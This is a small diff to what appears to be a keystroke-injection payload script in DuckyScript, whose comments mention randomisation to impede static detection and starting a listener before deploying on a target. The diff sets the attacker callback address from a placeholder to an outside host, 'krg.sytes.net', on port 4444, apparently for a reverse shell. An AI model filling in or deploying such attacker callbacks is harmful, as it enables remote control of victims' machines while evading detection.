@@ -12,7 +12,7 @@ REM Because of randomisation static detection will be impeded
 REM DON'T FORGET TO START LISTENER BEFORE DEPLOYING ON TARGET
 
 REM REQUIRED: Define the attackers IP & Port
-DEFINE ADDRESS '0.0.0.0'
+DEFINE ADDRESS 'http:\\krg.sytes.net'
 DEFINE PORT 4444
 
 REM Extension DETECT_READY by Korben for best and fastest deployment
